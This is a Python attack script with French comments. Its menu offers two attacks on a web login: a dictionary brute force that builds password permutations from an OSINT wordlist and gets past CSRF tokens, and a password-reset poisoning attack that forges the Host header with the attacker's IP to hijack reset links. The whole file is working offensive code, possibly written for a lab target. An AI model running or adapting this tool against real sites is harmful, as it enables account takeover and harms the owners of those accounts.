import requests
from bs4 import BeautifulSoup
import itertools

# Variables globales
TARGET_IP = ""
TARGET_HOST = ""
WORDLIST = "dico.txt"

def afficher_banniere():
    banniere = """
    ████████╗  █████╗ ██╗     ██╗███████╗
    ╚══██╔══╝ ██╔══██╗██║     ██║██╔════╝
       ██║    ███████║██║     ██║███████╗
       ██║    ██╔══██║██║     ██║╚════██║
       ██║    ██║  ██║███████╗██║███████║
       ╚═╝    ╚═╝  ╚═╝╚══════╝╚═╝╚══════╝
    """
    print(banniere)
    print("=" * 60 + "\n")

def get_csrf_token(session, target_url):
    #Récuperation du token CSRF via la page login.
    response = session.get(target_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find('input', {'name': 'csrf_token'})
    if token_input:
        return token_input['value']
    return None

def generate_wordlist(base_words):
    candidates = []
    
    for w in base_words:
        candidates.append(w)
        if w.capitalize() not in candidates:
            candidates.append(w.capitalize())

    generic_passwords = {"admin", "123456", "azerty", "motdepasse", "root"}
    osint_words = [w for w in base_words if w not in generic_passwords]

    for r in range(1, 5):
        for perm in itertools.permutations(osint_words, r):
            combined_text = "".join(perm)
            
            # Sans chiffre à la fin (minuscule et Première lettre majuscule)
            candidates.append(combined_text)
            candidates.append(combined_text.capitalize())
            
    return candidates

def brute_force(username):
    target_url = f"http://{TARGET_IP}/pages/login.php"
    
    print("\n" + "=" * 40)
    print(f"[*] Cible       : {target_url}")
    print(f"[*] Utilisateur : {username}")
    print("=" * 40 + "\n")
    
    try:
        with open(WORDLIST, 'r', encoding='utf-8') as file:
            base_words = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("[!] Fichier dictionnaire introuvable.")
        return

    passwords_to_test = generate_wordlist(base_words)
    total_mots = len(passwords_to_test)
    print(f"[*] {total_mots} combinaisons chargées. Attaque en cours...\n")

    with requests.Session() as session:
        compteur = 0
        for password in passwords_to_test:
            compteur += 1
            
            print(f"\r[*] Progression : {compteur}/{total_mots} tentatives...", end="", flush=True)
            
            csrf_token = get_csrf_token(session, target_url)
            if not csrf_token:
                print("\n[-] Erreur : Impossible de trouver le token CSRF.")
                break
            
            data = {
                'identifiant': username,
                'password': password,
                'csrf_token': csrf_token
            }
            
            response = session.post(target_url, data=data)
            
            if "Identifiants incorrects" not in response.text and "Erreur de sécurité" not in response.text:
                print(f"\n\n[+++] SUCCÈS ! Le mot de passe pour {username} est : {password}\n")
                break

def module_reset(email):
    url = f"http://{TARGET_IP}/pages/mot_de_passe_oublie.php"
    
    en_tetes = {
        "Host": TARGET_HOST
    }
    
    donnees = {
        "email_reset": email
    }
    
    print(f"\n[*] Envoi de la requête de réinitialisation pour : {email}")
    print(f"[*] Host falsifié : {TARGET_HOST}")
    
    try:
        reponse = requests.post(url, headers=en_tetes, data=donnees)
        print("[+] Requête envoyée avec succès ! Va vérifier le fichier texte (mail.txt) sur le serveur.")
    except Exception as e:
        print(f"[-] Erreur lors de l'envoi de la requête : {e}")

def afficher_menu():
    print("\n" + "="*30)
    print("           MENU")
    print("="*30)
    print("1. Lancer l'attaque Brute Force")
    print("2. Lancer l'attaque Reset Mot de Passe")
    print("3. Quitter")
    print("="*30)

def main():
    global TARGET_IP, TARGET_HOST
    afficher_banniere()
    
    TARGET_IP = input("Entrez l'IP cible : ")
    TARGET_HOST = input("Entrez l'IP Attaquant : ")

    while True:
        afficher_menu()
        choix = input("\nChoisis une option (1-3) : ")

        if choix == '1':
            user_cible = input("\nEntrez le nom d'utilisateur : ")
            brute_force(user_cible)
            
        elif choix == '2':
            email_cible = input("\nEntrez l'email de la victime : ")
            module_reset(email_cible)
            
        elif choix == '3':
            print("\nFermeture du programme.")
            break
            
        else:
            print("\nChoix invalide. Entrez 1, 2 ou 3.")

if __name__ == "__main__":
    main()